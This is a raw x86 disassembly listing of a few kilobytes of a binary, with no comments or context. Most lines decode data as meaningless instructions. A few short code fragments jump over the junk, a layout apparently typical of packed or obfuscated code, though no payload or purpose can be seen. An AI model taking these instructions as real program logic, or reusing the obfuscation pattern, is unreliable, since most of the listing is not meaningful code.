  41c535:	ss loope 0x41c4d4
  41c538:	add    eax,0x416747b6
  41c53d:	mov    ebx,0x295711ba
  41c542:	aad    0xc
  41c544:	jno    0x41c52c
  41c546:	(bad)  
  41c547:	sti    
  41c548:	sar    BYTE PTR [ebp+edx*1+0x66064781],1
  41c54f:	dec    esp
  41c550:	push   ebx
  41c551:	arpl   di,sp
  41c553:	and    DWORD PTR [ecx+ecx*4+0xdc4bcf7],esp
  41c55a:	pusha  
  41c55b:	or     ah,dh
  41c55d:	dec    ecx
  41c55e:	jb     0x41c5d8
  41c560:	adc    BYTE PTR [edx-0x65be5067],dl
  41c566:	jne    0x41c5e6
  41c568:	int3   
  41c569:	test   BYTE PTR [esi-0x60845f6e],0xdd
  41c570:	pop    ebp
  41c571:	mov    edi,0x115bc84b
  41c576:	div    DWORD PTR [ebp+0x43]
  41c579:	mov    eax,0x230256c1
  41c57e:	and    ah,BYTE PTR ds:0x11531e36
  41c584:	sar    bl,cl
  41c586:	mov    cl,0xff
  41c588:	xchg   ecx,eax
  41c589:	std    
  41c58a:	jno    0x41c5ec
  41c58c:	cmc    
  41c58d:	push   edi
  41c58e:	in     al,dx
  41c58f:	dec    ecx
  41c590:	jl     0x41c5c3
  41c592:	dec    esp
  41c593:	dec    ecx
  41c594:	add    bl,ch
  41c596:	and    esi,esp
  41c598:	jo     0x41c565
  41c59a:	adc    ch,BYTE PTR [eax+0x7eeda68c]
  41c5a0:	dec    esi
  41c5a1:	pop    edx
  41c5a2:	mov    ebp,0x1d3c1a73
  41c5a7:	js     0x41c5c5
  41c5a9:	push   edi
  41c5aa:	mov    ch,0x86
  41c5ac:	call   0x2fb0:0xa8b77907
  41c5b3:	iret   
  41c5b4:	(bad)  
  41c5b5:	and    cl,BYTE PTR [edi+0x358a71b4]
  41c5bb:	das    
  41c5bc:	leave  
  41c5bd:	ret    0x2905
  41c5c0:	and    BYTE PTR [edx+0x4b871ff8],bh
  41c5c6:	stc    
  41c5c7:	je     0x41c608
  41c5c9:	sahf   
  41c5ca:	xor    BYTE PTR [edx],bh
  41c5cc:	mov    cl,0x19
  41c5ce:	add    edi,DWORD PTR [ebx]
  41c5d0:	dec    esi
  41c5d1:	repz mov ah,0x61
  41c5d4:	adc    bl,BYTE PTR [eax-0x4e]
  41c5d7:	sahf   
  41c5d8:	or     DWORD PTR [eax-0xe],0x74
  41c5dc:	mov    edx,0x1955cd9a
  41c5e1:	pop    esp
  41c5e2:	lea    edi,[ecx+0x43aa9d68]
  41c5e8:	sbb    BYTE PTR [edi+0x7fac5245],ch
  41c5ee:	cli    
  41c5ef:	stos   DWORD PTR es:[edi],eax
  41c5f0:	mov    ebp,0x7821bfeb
  41c5f5:	cli    
  41c5f6:	(bad)  [ebx+0x71]
  41c5f9:	aaa    
  41c5fa:	and    eax,0x7836288f
  41c5ff:	ret    0xae95
  41c602:	inc    DWORD PTR [ebx+ecx*4+0x57]
  41c606:	xchg   BYTE PTR [ebx+0x798794f8],dh
  41c60c:	xor    DWORD PTR [ebx+0x50af29d5],eax
  41c612:	out    0xdf,al
  41c614:	rcr    BYTE PTR [ebp+0x2fc2069c],1
  41c61a:	clc    
  41c61b:	add    DWORD PTR [ebx],0x67
  41c61e:	mov    edi,0x97e1350f
  41c623:	mov    al,ds:0xd602e59c
  41c628:	sbb    esi,DWORD PTR [eax]
  41c62a:	stos   DWORD PTR es:[edi],eax
  41c62b:	pop    esi
  41c62c:	stos   DWORD PTR es:[edi],eax
  41c62d:	sbb    DWORD PTR [edx],0xffffffc2
  41c630:	jecxz  0x41c613
  41c632:	mov    dh,0xb9
  41c634:	sub    cl,bl
  41c636:	pop    eax
  41c637:	mov    dl,0x70
  41c639:	sub    al,0x12
  41c63b:	gs stos DWORD PTR es:[edi],eax
  41c63d:	dec    ebx
  41c63e:	sahf   
  41c63f:	cld    
  41c640:	add    al,0xbc
  41c642:	cmp    ah,BYTE PTR [ebp+0x31]
  41c645:	fadd   DWORD PTR [ebp-0x40]
  41c648:	pop    esp
  41c649:	outs   dx,BYTE PTR ds:[esi]
  41c64a:	nop
  41c64b:	pusha  
  41c64c:	out    dx,al
  41c64d:	test   BYTE PTR [ebp+0x1a6160f3],ch
  41c653:	(bad)  
  41c654:	into   
  41c655:	js     0x41c65b
  41c657:	jne    0x41c5e7
  41c659:	ss sbb eax,0x769188c2
  41c65f:	stos   DWORD PTR es:[edi],eax
  41c660:	repnz ins WORD PTR es:[edi],dx
  41c663:	sub    dh,ah
  41c665:	clc    
  41c666:	inc    esp
  41c667:	mov    bl,0x5
  41c669:	pop    ebx
  41c66a:	inc    esi
  41c66b:	(bad)  
  41c66c:	js     0x41c6e3
  41c66e:	xchg   BYTE PTR [edi+0x76],dh
  41c671:	mov    BYTE PTR [ecx],dl
  41c673:	pushf  
  41c674:	retf   0x292a
  41c677:	or     BYTE PTR [ebp+0x6d],bh
  41c67a:	(bad)  
  41c67c:	jae    0x41c603
  41c67e:	jge    0x41c6c4
  41c680:	inc    edi
  41c681:	mov    eax,ds:0x265dc217
  41c686:	fdiv   DWORD PTR [ebx]
  41c688:	fisttp DWORD PTR [ebp+0x1803f045]
  41c68e:	call   ebx
  41c690:	xor    ebx,ebx
  41c692:	inc    ebx
  41c693:	cmp    DWORD PTR [ebp+0x10],ebx
  41c696:	je     0x41c6b4
  41c69c:	xchg   edx,eax
  41c69d:	push   0xa
  41c69f:	pop    ecx
  41c6a0:	push   0x4
  41c6a2:	pop    ebx
  41c6a3:	inc    ebx
  41c6a4:	xchg   ebx,ecx
  41c6a6:	sub    ebx,ecx
  41c6a8:	xchg   ebx,ecx
  41c6aa:	dec    ecx
  41c6ab:	mov    eax,DWORD PTR [ebp-0x1c]
  41c6ae:	imul   eax,ecx
  41c6b1:	add    esp,eax
  41c6b3:	xchg   edx,eax
  41c6b4:	push   eax
  41c6b5:	xor    ebx,ebx
  41c6b7:	mov    edx,esp
  41c6b9:	jmp    0x41c8ee
  41c6be:	mov    bh,0xc9
  41c6c1:	iret   
  41c6c2:	leave  
  41c6c3:	rcr    edx,1
  41c6c5:	aad    0x5d
  41c6c7:	mov    ds:0x6994773e,eax
  41c6cc:	cmp    eax,0x7ff10000
  41c6d1:	js     0x41c6e3
  41c6d3:	jle    0x41c74d
  41c6d5:	js     0x41c6a0
  41c6d7:	bound  ecx,QWORD PTR [esi-0x51]
  41c6da:	lods   eax,DWORD PTR ds:[esi]
  41c6db:	shl    DWORD PTR [edx+0x5f],1
  41c6de:	sbb    DWORD PTR [ebp-0x23],ecx
  41c6e1:	push   edi
  41c6e2:	mov    cl,0xb5
  41c6e4:	test   BYTE PTR [edi+0x2],cl
  41c6e7:	xor    DWORD PTR [ebx+ebp*1-0x7450b45a],esp
  41c6ee:	ss sub bl,0x30
  41c6f2:	into   
  41c6f3:	in     eax,0x97
  41c6f5:	pop    ebx
  41c6f6:	mov    dh,0x3a
  41c6f8:	jge    0x41c69d
  41c6fa:	stos   DWORD PTR es:[edi],eax
  41c6fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6fc:	mov    DWORD PTR [ecx-0x38e7e8f1],esi
  41c702:	pop    ebp
  41c703:	cmp    al,0xc9
  41c705:	push   cs
  41c706:	mov    ebx,0x8397889e
  41c70b:	mov    ah,0x83
  41c70d:	pop    ebp
  41c70e:	sbb    DWORD PTR [ecx-0x5417eaab],edi
  41c714:	jle    0x41c719
  41c716:	mov    ds:0xb91c23b6,eax
  41c71b:	or     al,0x1e
  41c71d:	xor    esi,DWORD PTR [edi]
  41c71f:	pop    esp
  41c720:	sbb    ebx,DWORD PTR [edx]
  41c722:	retf   0x9dad
  41c725:	sub    al,0xa1
  41c727:	and    DWORD PTR [eax-0x49634695],eax
  41c72d:	add    al,al
  41c72f:	xlat   BYTE PTR ds:[ebx]
  41c730:	jl     0x41c6c4
  41c732:	sbb    eax,0x37e5ea2e
  41c737:	sub    DWORD PTR [ebp-0x56bb168],0xffffffaa
  41c73e:	xor    al,0x90
  41c740:	pop    edi
  41c741:	ret    
  41c742:	pop    esi
  41c743:	push   ecx
  41c744:	jl     0x41c78a
  41c746:	push   edi
  41c747:	pop    edx
  41c748:	aam    0xa
  41c74a:	jg     0x41c754
  41c74c:	jge    0x41c74a
  41c74e:	xor    DWORD PTR [edx+ecx*8],esi
  41c751:	test   al,0xc9
  41c753:	daa    
  41c754:	nop
  41c755:	push   esp
  41c756:	mov    al,ds:0x4d27cd8f
  41c75b:	sub    al,0xac
  41c75d:	aaa    
  41c75e:	xlat   BYTE PTR ds:[ebx]
  41c75f:	sbb    DWORD PTR [edx+0x41],edx
  41c762:	adc    al,0x5a
  41c764:	fcomp  QWORD PTR [edx+0x3e]
  41c767:	mov    ds:0x6e032dcf,al
  41c76c:	scas   eax,DWORD PTR es:[edi]
  41c76d:	dec    ecx
  41c76e:	push   0xffffffd3
  41c770:	loop   0x41c7dd
  41c772:	cmc    
  41c773:	add    dh,ch
  41c775:	xchg   edi,eax
  41c776:	adc    bh,0xf9
  41c779:	std    
  41c77a:	(bad)  
  41c77b:	out    dx,eax
  41c77c:	lds    edx,FWORD PTR [esi+0x24ebb7c7]
  41c782:	push   cs
  41c783:	in     eax,dx
  41c784:	mov    ebx,0x1cf50b5d
  41c789:	push   ds
  41c78a:	add    eax,0xa12926ec
  41c78f:	inc    esi
  41c790:	dec    ebx
  41c791:	push   ebx
  41c792:	fucomi st,st(3)
  41c794:	pop    edx
  41c795:	imul   edi,DWORD PTR [esi-0x34f61fd4],0x7e4e5257
  41c79f:	loope  0x41c761
  41c7a1:	iret   
  41c7a2:	pop    ecx
  41c7a3:	retf   0xeae2
  41c7a6:	aad    0x93
  41c7a8:	dec    edx
  41c7a9:	or     BYTE PTR [edx],al
  41c7ab:	xor    dl,al
  41c7ad:	lock fisubr DWORD PTR [ebx]
  41c7b0:	jmp    0x41c827
  41c7b2:	dec    ecx
  41c7b3:	(bad)  
  41c7b5:	add    eax,0xbb94b3a4
  41c7ba:	push   0x35f68fe2
  41c7bf:	fst    QWORD PTR [eax-0x206ac8c4]
  41c7c5:	jae    0x41c7de
  41c7c7:	shl    DWORD PTR [eax-0x19b164e0],0x63
  41c7ce:	jecxz  0x41c7de
  41c7d0:	(bad)  
  41c7d1:	retf   
  41c7d2:	sbb    bl,al
  41c7d4:	xor    al,0xa5
  41c7d6:	xor    ebx,DWORD PTR [edi+0x4039a6b4]
  41c7dc:	push   es
  41c7dd:	retf   0xbbd3
  41c7e0:	mov    edx,ecx
  41c7e2:	aam    0xc2
  41c7e4:	jne    0x41c771
  41c7e6:	cmp    eax,edi
  41c7e8:	pop    esi
  41c7e9:	in     eax,dx
  41c7ea:	xor    eax,0xd556d751
  41c7ef:	(bad)  
  41c7f0:	fwait
  41c7f1:	and    eax,DWORD PTR [edx-0x64]
  41c7f4:	mov    eax,0xf04ce23
  41c7f9:	and    bh,BYTE PTR [edi]
  41c7fb:	imul   ecx,DWORD PTR [ebp+0x60],0xffffffd6
  41c7ff:	mov    esp,0x85f30509
  41c804:	js     0x41c863
  41c806:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c807:	jno    0x41c87a
  41c809:	popa   
  41c80a:	cld    
  41c80b:	pop    ds
  41c80c:	push   eax
  41c80d:	gs loope 0x41c7b5
  41c810:	fs inc esp
  41c812:	dec    eax
  41c813:	ss pop esi
  41c815:	pop    ecx
  41c816:	seta   cl
  41c819:	loopne 0x41c87e
  41c81b:	(bad)  
  41c81c:	inc    BYTE PTR [edx+0x7]
  41c81f:	and    eax,0x376ff252
  41c824:	dec    eax
  41c825:	std    
  41c826:	mov    edx,0x6af326ee
  41c82b:	arpl   WORD PTR [ecx+0x5ee1f1da],bx
  41c831:	lods   al,BYTE PTR ds:[esi]
  41c832:	sub    al,dl
  41c834:	mov    eax,ds:0xb1e1f9a2
  41c839:	repz cmp edx,esi
  41c83c:	and    dh,BYTE PTR [edx]
  41c83e:	pop    edi
  41c83f:	sbb    BYTE PTR [ebx+0x22],al
  41c842:	bound  ebx,QWORD PTR [eax]
  41c844:	push   DWORD PTR [edx-0x62]
  41c847:	in     al,dx
  41c848:	data16 jae 0x41c886
  41c84b:	cmp    DWORD PTR [esi+0xef8a90a],esi
  41c851:	(bad)  [edi-0x621ed59d]
  41c857:	xchg   edi,eax
  41c858:	cmp    eax,0x5c7b060d
  41c85d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c85e:	(bad)  
  41c85f:	sbb    ecx,DWORD PTR [ecx-0x788441f4]
  41c865:	jo     0x41c7eb
  41c867:	in     al,0x3
  41c869:	out    0x61,al
  41c86b:	or     al,0xa2
  41c86d:	pop    edi
  41c86e:	sub    ecx,DWORD PTR [edx+0x22]
  41c871:	into   
  41c872:	cmp    ebp,DWORD PTR [ecx+0x361c525c]
  41c878:	dec    ebx
  41c879:	push   0xffffff87
  41c87b:	ficomp DWORD PTR [ecx-0x4e31a84b]
  41c881:	jns    0x41c855
  41c883:	mov    esi,0xe3f4ce17
  41c888:	out    0xa0,eax
  41c88a:	jge    0x41c878
  41c88c:	dec    edi
  41c88d:	adc    DWORD PTR [edx],edx
  41c88f:	enter  0x3dc4,0x7b
  41c893:	lds    ebp,FWORD PTR [ebp+0x56]
  41c896:	sub    ah,BYTE PTR [eax]
  41c898:	fcom   st(3)
  41c89a:	xor    al,0xa2
  41c89c:	pop    esp
  41c89d:	sbb    DWORD PTR [eax+ebx*1-0x7363c1db],ecx
  41c8a4:	sbb    DWORD PTR [ebp+0x14],0x6263ba9b
  41c8ab:	das    
  41c8ac:	ds add al,0xf3
  41c8af:	fstp   DWORD PTR [esi-0x15]
  41c8b2:	lahf   
  41c8b3:	jne    0x41c83b
  41c8b5:	(bad)  [eax+0x459941f7]
  41c8bb:	xor    eax,DWORD PTR [ecx+0x687f1b0]
  41c8c1:	jo     0x41c867
  41c8c3:	mov    eax,ds:0x1d42105
  41c8c8:	sbb    eax,0x40bb9523
  41c8cd:	jb     0x41c8f1
  41c8cf:	push   0xfda62415
  41c8d4:	pop    ss
  41c8d5:	push   edx
  41c8d6:	outs   dx,BYTE PTR ds:[esi]
  41c8d7:	aad    0x28
  41c8d9:	pop    eax
  41c8da:	out    dx,al
  41c8db:	jns    0x41c8a7
  41c8dd:	pop    edx
  41c8de:	mov    edi,ecx
  41c8e0:	fs mov eax,0xb465897a
  41c8e6:	aam    0x32
  41c8e8:	leave  
  41c8e9:	dec    esi
  41c8ea:	scas   eax,DWORD PTR es:[edi]
  41c8eb:	ror    DWORD PTR [ebp-0x44],1
  41c8ee:	dec    edx
  41c8ef:	inc    ebx
  41c8f0:	add    ebx,DWORD PTR [edx+ebx*1]
  41c8f3:	dec    ebx
  41c8f4:	xor    edx,edx
  41c8f6:	add    DWORD PTR [ebp-0xc],ebx
  41c8f9:	pop    ebx
  41c8fa:	mov    eax,DWORD PTR [ebp-0xc]
  41c8fd:	pop    edi
  41c8fe:	jmp    0x41cb33
  41c903:	rcl    al,0xd2
  41c906:	ret    
  41c907:	ror    cl,cl
  41c909:	aad    0xdb
  41c90b:	and    BYTE PTR [ecx-0x7e],0x5e
  41c90f:	pop    es
  41c910:	pop    edx
  41c912:	and    eax,0x787ff718
  41c917:	adc    BYTE PTR [esi+0x78],bh
  41c91a:	js     0x41c968
  41c91c:	sub    eax,DWORD PTR [ecx-0x4de015e8]
  41c922:	das    
  41c923:	push   ds
  41c924:	stos   DWORD PTR es:[edi],eax
  41c925:	add    BYTE PTR [esi],bh
  41c927:	and    BYTE PTR [ecx+0x7a],ah
  41c92a:	mov    ah,0xd9
  41c92c:	rcl    DWORD PTR [ebx+0x595b5517],cl
  41c932:	cmp    edi,DWORD PTR [ebx-0x1744e6c4]
  41c938:	cli    
  41c939:	cmp    DWORD PTR [edi],ecx
  41c93b:	push   edi
  41c93c:	loop   0x41c8ea
  41c93e:	xchg   ecx,eax
  41c93f:	ret    0xb37
  41c942:	(bad)  
  41c943:	gs cmc 
  41c945:	xchg   edi,eax
  41c946:	or     ecx,DWORD PTR [ecx+0x5b]
  41c949:	mov    fs,esp
  41c94b:	dec    esi
  41c94c:	push   ds
  41c94d:	push   esp
  41c94e:	pushf  
  41c94f:	cmp    al,0x80
  41c951:	aam    0x55
  41c953:	add    esp,DWORD PTR [ecx]
  41c955:	out    0x99,al
  41c957:	into   
  41c958:	push   es
  41c959:	jb     0x41c9c7
  41c95b:	cmp    bh,BYTE PTR [esi-0x634a5fae]
  41c961:	jmp    FWORD PTR [ebx+0x54]
  41c964:	out    0xee,al
  41c966:	lods   eax,DWORD PTR ds:[esi]
  41c967:	ja     0x41c9df
  41c969:	xor    eax,DWORD PTR [esi-0x27d88ca9]
  41c96f:	fcomp  DWORD PTR [ebx+0x75]
  41c972:	pop    ebp
  41c973:	fidivr DWORD PTR [eax+0x54]
  41c976:	or     eax,0x76dfd879
  41c97b:	out    dx,eax
  41c97c:	push   ecx
  41c97d:	dec    ebp
  41c97e:	mov    dl,bl
  41c980:	mov    bl,0x12
  41c982:	repnz lods eax,DWORD PTR ds:[esi]
  41c984:	pop    DWORD PTR [edx+eiz*2+0x5f345dd0]
  41c98b:	pushf  
  41c98c:	(bad)  
  41c98d:	data16 jecxz 0x41c94a
  41c990:	jno    0x41c990
  41c992:	pop    ss
  41c993:	repz jo 0x41c965
  41c996:	and    al,0x5
  41c998:	out    dx,eax
  41c999:	xchg   ebx,eax
  41c99a:	adc    eax,0x8a10db7f
  41c99f:	shl    BYTE PTR [ebx-0x59c3b7d3],1
  41c9a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9a6:	push   ebx
  41c9a7:	and    ecx,DWORD PTR [eax]
  41c9a9:	adc    ecx,DWORD PTR [ecx-0xba68e2d]
  41c9af:	cmp    BYTE PTR [ecx],dh
  41c9b1:	inc    ecx
  41c9b2:	xor    eax,DWORD PTR [esi]
  41c9b4:	or     DWORD PTR [edi+0x5ed4f49b],ebx
  41c9ba:	loope  0x41ca13
  41c9bc:	xor    al,0x34
  41c9be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9bf:	sbb    DWORD PTR [ecx+0x1b],esp
  41c9c2:	adc    esp,DWORD PTR [ebx]
  41c9c4:	scas   al,BYTE PTR es:[edi]
  41c9c5:	jns    0x41ca1e
  41c9c7:	push   esp
  41c9c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9c9:	lods   al,BYTE PTR ds:[esi]
  41c9ca:	and    al,0xe5
  41c9cc:	int    0xf8
  41c9ce:	int3   
  41c9cf:	jg     0x41c96e
  41c9d1:	sub    edx,DWORD PTR [esi]
  41c9d3:	push   0x2f
  41c9d5:	xlat   BYTE PTR ds:[ebx]
  41c9d6:	cmp    BYTE PTR [eax],ah
  41c9d8:	mov    ds:0x9a0bb55e,al
  41c9dd:	mov    edi,0x4b99d9de
  41c9e2:	mov    esp,0x205a1fb5
  41c9e7:	fsubr  QWORD PTR [edi]
  41c9e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9ea:	xchg   esp,eax
  41c9eb:	sbb    BYTE PTR [edx+0x40926910],0xc6
  41c9f2:	cld    
  41c9f3:	jb     0x41c99e
  41c9f5:	into   
  41c9f6:	repnz ror ebx,1
  41c9f9:	icebp  
  41c9fa:	inc    eax
  41c9fb:	jb     0x41ca0c
  41c9fd:	fist   DWORD PTR [ecx]
  41c9ff:	mov    BYTE PTR [esi+0x1f13fa69],al
  41ca05:	adc    edx,DWORD PTR [edi+0x79]
  41ca08:	add    BYTE PTR [ebp+0xa27b567],cl
  41ca0e:	ret    
  41ca0f:	push   eax
  41ca10:	inc    esi
  41ca11:	les    ecx,FWORD PTR [edx-0x1786ee8f]
  41ca17:	jge    0x41ca63
  41ca19:	addr16 cmp al,0x3b
  41ca1c:	sub    DWORD PTR [ebx+0x60df5311],eax
  41ca22:	arpl   WORD PTR [esi-0x19064160],bp
  41ca28:	add    bl,BYTE PTR [ebx-0x22]
  41ca2b:	arpl   WORD PTR [edi-0x33],si
  41ca2e:	cmp    BYTE PTR [edi+0x13],bh
  41ca31:	or     ebx,edi
  41ca33:	daa    
  41ca34:	cmp    bl,BYTE PTR [ecx]
  41ca36:	xor    al,0xc4
  41ca38:	or     ecx,esi
  41ca3a:	adc    bl,0xb0
  41ca3d:	std    
  41ca3e:	daa    
  41ca3f:	mov    DWORD PTR [edi+eax*4-0x3b],ecx
  41ca43:	(bad)  
  41ca45:	test   al,0xa4
  41ca47:	jns    0x41c9fc
  41ca49:	pop    esi
  41ca4a:	imul   ecx,DWORD PTR [ebx],0xffffffba
  41ca4d:	and    eax,0x9a091da9
  41ca52:	add    DWORD PTR [esi],ebx
  41ca54:	mov    ch,0x71
  41ca56:	enter  0x7640,0x19
  41ca5a:	mov    ds:0xdb812a2a,eax
  41ca5f:	push   ecx
  41ca60:	cmp    edi,DWORD PTR [edx-0x38cdff9e]
  41ca66:	repz mov al,0xc9
  41ca69:	add    bl,bl
  41ca6b:	and    dh,BYTE PTR [ebx]
  41ca6d:	ret    
  41ca6e:	push   edx
  41ca6f:	pop    edx
  41ca70:	adc    DWORD PTR [edx+ebx*8-0x19],edx
  41ca74:	fs push ecx
  41ca76:	inc    edi
  41ca77:	push   ebx
  41ca78:	icebp  
  41ca79:	adc    DWORD PTR [eax+0xea2d82],0xb171ea4c
  41ca83:	push   ds
  41ca84:	test   al,0xd2
  41ca86:	pop    ds
  41ca87:	cmp    ch,BYTE PTR [ebx]
  41ca89:	xchg   BYTE PTR [ecx+edx*1-0x21],bh
  41ca8d:	inc    edx
  41ca8e:	fstp   DWORD PTR [esi+ecx*8-0x7]
  41ca92:	icebp  
  41ca93:	sbb    eax,0x9c1717e5
  41ca98:	ds addr16 pusha 
  41ca9b:	or     eax,0xddc86cb
  41caa0:	cs (bad) 
  41caa2:	outs   dx,DWORD PTR ds:[esi]
  41caa3:	sub    BYTE PTR [ebx+0x4e],bh
  41caa6:	aad    0x7
  41caa8:	int    0xec
  41caaa:	(bad)  
  41caab:	std    
  41caac:	das    
  41caad:	ss out dx,al
  41caaf:	xchg   BYTE PTR [eax*8+0x7edaff21],dh
  41cab6:	clc    
  41cab7:	inc    esp
  41cab8:	push   edx
  41cab9:	fmul   DWORD PTR [ebx]
  41cabb:	push   0xffffff83
  41cabd:	cmp    ah,BYTE PTR [ebx+0xf0e7b23]
  41cac3:	test   edi,edi
  41cac5:	xchg   esi,eax
  41cac6:	stos   DWORD PTR es:[edi],eax
  41cac7:	sub    al,0xad
  41cac9:	rol    dl,0x68
  41cacc:	aaa    
  41cacd:	inc    DWORD PTR [edi+0x368c8ab0]
  41cad3:	pusha  
  41cad4:	outs   dx,DWORD PTR ds:[esi]
  41cad5:	push   eax
  41cad6:	cmp    bh,dl
  41cad8:	lahf   
  41cad9:	xor    DWORD PTR [edi+0x62b1c89],edi
  41cadf:	retf   
  41cae0:	out    0x6e,eax
  41cae2:	cli    
  41cae3:	add    DWORD PTR [ebp+0x27],ebp
  41cae6:	push   esi
  41cae7:	sub    esp,ebp
  41cae9:	inc    edi
  41caea:	test   al,0xf9
  41caec:	pop    edi
  41caed:	add    BYTE PTR [ebp+edx*8-0x20],cl
  41caf1:	pop    ecx
  41caf2:	mov    esi,0xad2a71db
  41caf7:	mov    esi,0xd37ca0b1
  41cafc:	and    al,bh
  41cafe:	lds    esi,FWORD PTR ds:0x8a21da7c
  41cb04:	fs xchg esp,eax
  41cb06:	mov    bl,0xfa
  41cb08:	and    BYTE PTR [edx+edx*1-0x64a149ce],ch
  41cb0f:	inc    esp
  41cb10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb11:	push   edi
  41cb12:	ret    0x54a4
  41cb15:	push   cs
  41cb16:	push   edx
  41cb17:	jmp    0x41cab6
  41cb19:	add    dl,BYTE PTR ds:0x68623cd1
  41cb1f:	fcom   st(6)
  41cb21:	les    ebx,FWORD PTR [edx]
  41cb23:	dec    edx
  41cb24:	enter  0x13a0,0x3f
  41cb28:	mov    edx,0xf2e749ee
  41cb2d:	pop    eax
  41cb2e:	mov    eax,ds:0x7c79eb19
  41cb33:	pop    esi
  41cb34:	jmp    0x41cd69
  41cb39:	into   
  41cb3a:	iret   
  41cb3b:	into   
  41cb3c:	ror    ch,1
  41cb3e:	aad    0xd6
  41cb40:	aad    0xbe
  41cb42:	mov    esp,0x596e6037
  41cb47:	pop    ss
  41cb48:	aad    0x30
  41cb4a:	cmc    
  41cb4b:	jg     0x41cbc5
  41cb4d:	adc    BYTE PTR [esi+0x78],bh
  41cb50:	js     0x41cada
  41cb52:	repz shr DWORD PTR [eax+eax*2+0x6958f1bb],cl
  41cb5a:	sub    ecx,ebx
  41cb5c:	push   0x43726100
  41cb61:	cmp    DWORD PTR fs:[eax],0xffffff86
  41cb65:	push   ecx
  41cb66:	sub    al,0x36
  41cb68:	adc    al,0xbf
  41cb6a:	imul   ecx,DWORD PTR [eax+ecx*1-0x37029f8a],0xd94f208e
  41cb75:	scas   eax,DWORD PTR es:[edi]
  41cb76:	adc    bh,BYTE PTR [ebx-0x78]
  41cb79:	xor    bl,BYTE PTR [edx]
  41cb7b:	adc    eax,0x93172af5
  41cb80:	jmp    0x41cb19
  41cb82:	ficom  WORD PTR [ebp+eiz*8+0x2e056f25]
  41cb89:	jno    0x41cb24
  41cb8b:	pop    esi
  41cb8c:	sub    cl,BYTE PTR ds:0x4694a3b5
  41cb92:	jge    0x41cb18
  41cb94:	div    BYTE PTR [esi]
  41cb96:	lea    esp,[eax]
  41cb98:	push   eax
  41cb99:	mov    ds:0x88611ac7,al
  41cb9e:	dec    esi
  41cb9f:	loop   0x41cb81
  41cba1:	jo     0x41cba1
  41cba3:	push   ecx
  41cba4:	mul    esi
  41cba6:	sbb    DWORD PTR [ebx+0x506711da],ecx
  41cbac:	cmp    edi,eax
  41cbae:	cmp    esp,esp
  41cbb0:	dec    esi
  41cbb1:	sbb    eax,0x725df266
  41cbb6:	add    eax,0xcee358cb
  41cbbb:	cld    
  41cbbc:	mov    edx,0x63f8da7d
  41cbc1:	in     eax,0x6a
  41cbc3:	xchg   ecx,eax
  41cbc4:	lock int 0x1
  41cbc7:	mov    edx,0x7eddddd2
  41cbcc:	add    eax,0xa6db01db
  41cbd1:	push   0xed159b9c
  41cbd6:	push   0xc69af31f
  41cbdb:	pusha  
  41cbdc:	mov    ds:0xdeebd8bb,eax
  41cbe1:	mov    ds:0x2b01dfda,eax
  41cbe6:	(bad)  
  41cbe7:	mov    ecx,0x7345279d
  41cbec:	pop    ebx
  41cbed:	das    
  41cbee:	or     al,0xb6
  41cbf0:	retf   
  41cbf1:	ficomp WORD PTR [esi]
  41cbf3:	or     ecx,DWORD PTR [edi+eax*1]
  41cbf6:	ret    
  41cbf7:	shl    DWORD PTR [ebp-0x59dc8e3],1
  41cbfd:	xor    BYTE PTR [edx+0x73],bh
  41cc00:	mov    dl,0x50
  41cc02:	pop    edx
  41cc03:	sub    BYTE PTR [ebp+ecx*4+0x60],bh
  41cc07:	xchg   ebx,eax
  41cc08:	sti    
  41cc09:	add    DWORD PTR [ebp+0xcf125cc],ebx
  41cc0f:	sbb    BYTE PTR [eax+0x32a8068d],dl
  41cc15:	inc    esi
  41cc16:	into   
  41cc17:	jne    0x41cbe5
  41cc19:	out    dx,al
  41cc1a:	iret   
  41cc1b:	(bad)  
  41cc1c:	out    0xe1,eax
  41cc1e:	test   al,0x8a
  41cc20:	lahf   
  41cc21:	lods   eax,DWORD PTR ds:[esi]
  41cc22:	pusha  
  41cc23:	int3   
  41cc24:	stos   BYTE PTR es:[edi],al
  41cc25:	or     al,0xc8
  41cc27:	lock fst QWORD PTR [edx]
  41cc2a:	mov    ebx,0x923691aa
  41cc2f:	adc    eax,0x335a379c
  41cc34:	or     al,BYTE PTR gs:0xb8f1908b
  41cc3b:	test   BYTE PTR [esi+0x58754f55],al
  41cc41:	pop    ss
  41cc42:	ss sti 
  41cc44:	and    DWORD PTR [edi-0x58],esi
  41cc47:	aaa    
  41cc48:	pusha  
  41cc49:	mov    esi,0xd830b61f
  41cc4e:	fstp   QWORD PTR ds:0xf72bdbf1
  41cc54:	dec    ecx
  41cc55:	cwde   
  41cc56:	in     al,0x8a
  41cc58:	mov    edx,0xe07daa3
  41cc5d:	inc    edx
  41cc5e:	test   al,0xaf
  41cc60:	imul   eax,ecx,0xcff081c5
  41cc66:	sbb    eax,edi
  41cc68:	xchg   esp,eax
  41cc69:	dec    BYTE PTR [eax]
  41cc6b:	xchg   esp,eax
  41cc6c:	cwde   
  41cc6d:	add    al,0x18
  41cc6f:	sbb    eax,0x81ad2f19
  41cc74:	arpl   WORD PTR [edx],cx
  41cc76:	mov    dh,0xd1
  41cc78:	add    edx,DWORD PTR [edi-0x19]
  41cc7b:	xchg   ebx,eax
  41cc7c:	xchg   ebp,eax
  41cc7d:	push   edx
  41cc7e:	mov    DWORD PTR [esi+0x6f],edi
  41cc81:	(bad)  
  41cc83:	scas   al,BYTE PTR es:[edi]
  41cc84:	lock lds esp,FWORD PTR [edx+0xdd416f]
  41cc8b:	xchg   edx,eax
  41cc8c:	add    al,BYTE PTR [ebx+0x47]
  41cc8f:	xor    DWORD PTR [eax],esi
  41cc91:	mov    bl,BYTE PTR [edi-0x8ec6acd]
  41cc97:	es jae 0x41cc1e
  41cc9a:	jmp    0xe087:0xc0f0de4a
  41cca1:	rcr    ah,cl
  41cca3:	js     0x41cce5
  41cca5:	jle    0x41cc9b
  41cca7:	adc    bh,BYTE PTR [edi+0xcca069c]
  41ccad:	push   edi
  41ccae:	test   DWORD PTR [ebp-0x32],0x87a02187
  41ccb5:	int3   
  41ccb6:	aaa    
